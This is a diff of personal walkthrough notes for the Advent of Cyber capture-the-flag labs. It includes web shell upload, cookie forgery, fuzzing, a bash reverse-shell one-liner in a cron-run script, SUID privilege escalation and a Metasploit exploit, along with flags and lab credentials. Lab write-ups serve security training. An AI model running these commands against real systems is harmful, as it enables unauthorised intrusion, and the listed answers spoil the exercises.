@@ -1,4 +1,7 @@
-# Day 1 - Web Exploitation: A Christmas Crisis
+# Advent of Cyber
+
+## Day 1 - Web Exploitation: A Christmas Crisis
+
 	- Credentials:
 		username - kyle
 		password - test1234
@@ -13,7 +16,8 @@
 	5. What is the flag given when the line is fully active?
 		Using the reencoded cookie we can add a cookie with a name of "auth" and a value of the newly encoded cookie, it should by pass the login screen and allow us to change the assembly line to all on. 
 
-# Day 2 - Web Exploitation: The Elf Strikes Back!
+## Day 2 - Web Exploitation: The Elf Strikes Back!
+
 	- ID number to gian access to the upload page
 		ODIzODI5MTNiYmYw
 	1. String of texted added to the URL to access upload page
@@ -25,17 +29,20 @@
 	4. Activate the listener you have running
 		go to webaddress - http://IPADDRESS/uploads/shell.jpg.php?id=ODIzODI5MTNiYmYw
 
-# Day 3 - Web Exploitation: Christmas Chaos
+## Day 3 - Web Exploitation: Christmas Chaos
+
 	1. This task is teaching you how to use burp suite. I configured foxyproxy to forward traffic to burp suite when turned on. Go to the website, attemp to log in and let burp capture the request. Send the request to Intruder with a right click. Running the suggested password through intruder, they all have the same status, which is a redirect error, but the length on one is different and worth checking out. 
 
-# Day 4 - Web Exploitation: Santa's Watching
+## Day 4 - Web Exploitation: Santa's Watching
+
 	- In this challenge make sure to either make a date wordlist in the format that they suggest, or download the one from the challenge. 
 	1. run gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://IP to use the word list on the site directory to find the api/ directory
 	2. Notice the file that is in the api directory when you go there from a web browser.
 		site-log.php
 	3. use wfuzz -c -z file,wordlist http://10.10.134.147/api/site-log.php?date=FUZZ to fuzz the date and search for the file that has the flag in it.
 
-# Day 5 - Web Exploitation: Someone stole Santa's gift list!
+## Day 5 - Web Exploitation: Someone stole Santa's gift list!
+
 	1. Sanata's login panel without brute forcing?
 		/santapanel
 	2. visit the secretpanel and by pass the login
@@ -50,7 +57,8 @@
 	6. What is the admin's password?
 		EhCNSWzzFP6sc7gB
 
-# Day 6 - Web Exploitation: Be careful with what you wish on a Christmas night
+## Day 6 - Web Exploitation: Be careful with what you wish on a Christmas night
+
 	1. What vulnerability type was used to exploit the application?
 		Because you can post comments that allow you to save a script and have it execute everytime the page is loaded this is Store XSS
 	2. What query string can be abused to craft a reflected XSS?
@@ -58,7 +66,8 @@
 	3. How many XSS alerts are in the scan?
 		ZAP said 6, but I think the question means to ask how many high alerts are in the scan. because the answer to that is 2
 
-# Day 7 - Networking: The Grinch Really Did Steal Christmas
+## Day 7 - Networking: The Grinch Really Did Steal Christmas
+
 	1. What is the IP address that initiates ICMP?
 		To get this open the packet capture in Wireshark, and in the filter bar type ICMP to only show icmp
 	2. To see Http get requests, what filter would you use?
@@ -72,7 +81,8 @@
 	6. What is on Elf McSkidy's wishlist that will be used to replace Elf McEager?
 		Open pcap, export http and locate christmas.zip. Save and unzip. Locate wish list filee in zip file. Rubber ducky
 
-# Day 8 - Networking: What's under the Christmas tree?
+## Day 8 - Networking: What's under the Christmas tree?
+
 	1. When was snort created?
 		1998
 	2. What 3 services are running on the server?
@@ -82,7 +92,8 @@
 	6. What might the webserver be used for?
 		Internal Blog - nmap -A <IP>
 
-# Day 9 - Networking - Anyone can be Santa!
+## Day 9 - Networking - Anyone can be Santa!
+
 	1. What folder does  the anonymous user have access to?
 		public - checked by typing ls -al 
 	2. What script gets executed within this directory?
@@ -92,7 +103,8 @@
 	4. What is the contents of the flag?
 		THM{even_you_can_be_santa} - The flag is located in the root home directory, so how do we get there? We use a reverse shell. We need to download the backup script and modify it and reupload the script so that it gets executed and runs the commands that you want it to run. Using the pentesters cheatsheet, we can see a one line command that when executed redirects a shell to a listening IP address. This command is bash -i >& /dev/tcp/<Your IP Address>/4444 0>&1 .On your attacking machine you need to have a netcat listener running, using the command nc -lvnp 4444, in a new comand line. After waiting a minute the script will run and you will be granted access to a shell on your netcat listener where you can read the contents of the file.
 
-# Day 10 - Networking: Don't be sElfish!
+## Day 10 - Networking: Don't be sElfish!
+
 	1. How many users are there one the Samba server?
 		3 - you are able to use enum4linux -U <IP> and it will list how many users there are
 	2. How many shares are on the Samba server?
@@ -102,7 +114,8 @@
 	4. What directory did ElfMcSkidy leave for Santa?
 		jingle-tunes - once logged in to the samba share, you can run ls and it will list like a normal shell.
 
-# Day 11 - Networking: The Rogue Gnome: Prelude
+## Day 11 - Networking: The Rogue Gnome: Prelude
+
 	1. What type of privilege escalation involves using a user account to execute commands as an administrator?
 		vertical
 	2. What is the name of the file that contains a list of users who are a part of the sudo group?
@@ -110,7 +123,8 @@
 	3. What are the contents of the file located at /root/flag.txt
 		This is probably the trickiest task of the advent so far this year. The LinEnum script needs to be downloaded first and placed in a directory. From here start up a simple file server with python. for python2.7 - python -m SimpleHTTPServer 8080 and for python 3+ - python3 -m http.server 8080, both of these do the same thing and must be started from the same directory that your LinEnum script is located. Once started up log into the machine you are given the credentials for, and change the directory you have write permissions to like /tmp (your home directory has write permissions in this instance, but that is not always the case), and run wget http://<yourip>:8080/LinEnum.sh. This will upload the script to the remote server from your machine. One it is downloaded set the script to be executeable, and run it.  The ouput gives you some suggestions for suids that are of interest. On this server the the suid of insterst is bash. Using the getfobins site, it tells us that to use bash with a suid bit it should be run with bash -p. This retuns a bash prompt. From here you are running as root and can read the flag file in the root directory. 
 
-# Day 12 - Networking: Ready, Set, Elf
+## Day 12 - Networking: Ready, Set, Elf
+
 	1. What is the version number of the web server?
 		The web server is an Apache Tomcat 9.0.17 server this can be obtained from an nmap scan, sudo nmap -sS -sV --script vuln <IP>
 	2. What CVE can be used to create a meterpreter entry onto the machine? 
@@ -118,7 +132,8 @@
 	3. What are the contents of flag1.txt?
 		thm{whacking_all_the_elves} I was able to acheive this by using metasploit. Once I started up metasploit I use the search feature and search for that cve specified. I then use the exploit that it recommends. Set all the options in the challenge description, most importantly the targeturi, rhosts, and lhost. Then exploit the machine. It will get a meterpreter session and you can read the flag from this session. One step further, I was able to choose the ElfWhacker.exe process and migrate to it sucessfully, which escalated my privileges to NTSYSTEM
 
-# Day 13 - Special by John Hammond: Coal for Christmas
+## Day 13 - Special by John Hammond: Coal for Christmas
+
 	1. What old, deprecated protocol and service is running?
 		nmap -sCV <IP> will display telnet is running on this machine
 	2. What credential was left for you?
@@ -134,7 +149,8 @@
 	7. What is the MD5 hash output?
 		8b16f00dd3b51efadb02c1df7f8427cc - this was found by changing to the root directory and running cat, on the file called message_from_the_grinch.txt in this directory and following the instructions
 
-# Day 14 - Special by TheCyberMentor: Where's Rudolph? - OSINT
+## Day 14 - Special by TheCyberMentor: Where's Rudolph? - OSINT
+
 	1. What URL will take me directly to Rudolph's Reddit comment history?
 		https://www.reddit.com/user/IGuidetheClaus2020/comments - this can be found with a quick search of the provided username on google or reddit directly
 	2. According to Rudolph, where was he born?
@@ -158,7 +174,8 @@
 	11. Based on all the information gathered. It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile. What are the street numbers of the hotel address?
 		540 - using the coordinates, and google maps to locate hexact address of the Marriot that he was staying in.
 
-# Day 15 - Scripting: There's a Python in my stocking!
+## Day 15 - Scripting: There's a Python in my stocking!
+
 	1. What's the output of True + True?
 		2 - True is equal to 1, so naturally 1 + 1 = 2
 	2. What's the database for installing other peoples libraries called?
@@ -172,7 +189,8 @@
 	6. What causes the previous task to output that?
 		Pass by reference - this was in the challenge info
 
-# Day 16 - Scripting: Help! Where is Santa?
+## Day 16 - Scripting: Help! Where is Santa?
+
 	1. What is the port number for the web server?
 		8000 - This was obtained from an nmap scan. nmap -sCVS <IP>
 	2. Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)
@@ -192,7 +210,8 @@
     	r = requests.get(server + port + '/api/' + j)
     	print(r.text) ```
 
-# Day 17 - Reverse Engineering: ReverseELFneering
+## Day 17 - Reverse Engineering: ReverseELFneering
+
 	1.  What is the value of local_ch when its corresponding movl instruction is called (first if multiple)? 
 		1 - 0x00400b51 b    c745f4010000.  mov dword [local_ch], 1 this is the line where the number 1 gets moved into the local_ch variable
 	2. What is the value of eax when the imull instruction is called?
@@ -200,16 +219,19 @@
 	3. What is the value of local_4h before eax is set to 0?
 		6 - from the same line as above it was set to 6 and wasn't changed until it was set to 0.
 
-# Day 18 - Reverse Engineering: The Bits of Christmas
+## Day 18 - Reverse Engineering: The Bits of Christmas
+
 	2. What is Santa's password?
 		santapassword321 - by searching around in different locations in the program break down I was able to find the password verification page. 
 	3. Now that you've retrieved this password, try to login...What is the flag?
 		thm{046af} - on the same page as the password verification, with a correct password it reveals the flag
 
-# Day 19 - Special by Tib3rius: The Naughty or Nice List
+## Day 19 - Special by Tib3rius: The Naughty or Nice List
+
 	This task is a guided task
 	
-# Day 20 - Blue Teaming: PowershELlF to the rescue 	
+## Day 20 - Blue Teaming: PowershELlF to the rescue 	
+
 	1. Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?
 		2 front teeth - to find this you can use the powershell cmdlet Get-ChildItem -File -Hidden then read the contents of the file
 	2. Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?
@@ -223,7 +245,8 @@
 	6. This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?
 		Red Ryder BB Gun - the cmdlet for this is ```Select-String -Path 2.txt -pattern 'redryder*'````
 
-# Day 21 - Blue Teaming: Time for some ELForensics
+## Day 21 - Blue Teaming: Time for some ELForensics
+
 	1. Read the contents of the text file within the Documents folder. What is the file hash for db.exe?
 		596690FFC54AB6101932856E6A78E3A1 - This can be found by changing to the Documents directory for the user little helper and running the command ````type '.\db file hash.txt'````
 	2. What is the file hash of the mysterious executable within the Documents folder?
@@ -233,7 +256,8 @@
 	4. What is the flag that is displayed when you run the database connector file?
 		THM{088731ddc7b9fdeccaed982b07c297c} - the first thing to do is to run the deebee.exe file and see what it outputs. Which tells you that the database connection file has been hidden, but we need to check the Alternate Data Stream(ADS) of this file using the cmdlet ```Get-Item -Path .\deebee.exe -Stream *``` this displays that there is a hidden portion of this file that needs to be shown. We can then run the exe from this ADS using the command ```wmic process call create $(Resolve-Path .\deebee.exe:hidedb)
 
-# Day 22 - Blue Teaming: Elf McEager becomes CyberElf
+## Day 22 - Blue Teaming: Elf McEager becomes CyberElf
+
 	1. What is the password to the KeePass database?
 		thegrinchwashere - To find this password I was able to open cyberchef, select the 'magic' recipe, and paste the name of the folder into cyberchef. It was able to decode the name a base64.
 	2. What is the encoding method listed as the 'Matching ops'?
@@ -245,7 +269,8 @@
 	5. Decode the last encoded value. What is the flag?
 		THM{657012dcf3d1318dca0ed864f0e70535} - this was a little trickier. To get the flag you had to look in the keepass recycling bin and looking in the notes of the only entry there. Putting the notes in cyberchef doesn't do anything. A google search on the function that is in the notes google tells that it is javascript. I wasa able to locate an online converter for those numbers and it decodes to pretty long string, that appears to have another javascript function in it. I  was able to take the numbers that are in the decoded javascript, and decode them as well and it decodes to a website. Once you go to the website you can see the flag at the top of the screen.
 
-# Day 23 - Blue Teaming: The Grinch Strikes Again
+## Day 23 - Blue Teaming: The Grinch Strikes Again
+
 	1. Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value?
 		nomorebestfestivalcompany - this password is bas64 encrypted
 	2.At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?
@@ -261,7 +286,8 @@
 	7. Right-click and inspect the properties for the hidden folder. Use the 'Previous Versions' tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file?
 		m33pa55w0rdIZseecure! - restore previous version of the folder and masterpassword.txt file becomes apparent.
 
-# Day 24 - Special by DarkStar: The Trial Before Christmas
+## Day 24 - Special by DarkStar: The Trial Before Christmas
+
 	1.Scan the machine. What ports are open?
 		80, 65000 - usd nmap -sSVC <ipaddress>
 	2. What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.
